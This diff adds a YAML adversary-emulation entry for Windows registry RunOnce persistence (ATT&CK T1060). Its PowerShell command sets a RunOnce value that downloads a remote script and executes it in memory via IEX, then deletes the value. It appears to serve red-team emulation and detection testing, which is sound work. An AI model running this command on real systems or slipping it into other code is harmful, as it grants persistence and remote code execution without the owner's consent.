@@ -1,0 +1,16 @@
+---
+
+- id: tacpersi-1060-AR02-1v00-200120184608
+  name: PowerShell Registry RunOnce
+  description: .      RunOnce Key Persistence via PowerShell.  
+  tactic: persistence
+  technique:
+    attack_id: T1060
+    name: Registry Run Keys / Start Folder
+  platforms:
+    windows:
+      psh:
+        command: |
+            $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+            Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
